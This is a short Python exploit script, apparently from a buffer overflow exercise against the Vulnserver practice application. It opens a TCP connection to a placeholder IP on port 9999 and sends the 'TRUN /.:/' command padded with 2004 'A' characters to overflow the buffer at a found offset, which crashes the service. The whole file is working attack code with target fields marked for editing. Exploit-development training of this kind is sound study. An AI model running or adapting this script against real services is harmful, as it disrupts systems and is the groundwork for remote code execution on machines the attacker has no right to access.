#!/usr/bin/python3
import socket

offset = "A" * 2004

target_ip = "10.10.10.10" # CHANGE THIS
target_port = 9999 # CHANGE THIS

try:

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))

    payload = "TRUN /.:/" + offset

    s.send((payload.encode()))
    s.close()

except Exception as e:
    #print(e)
    exit()
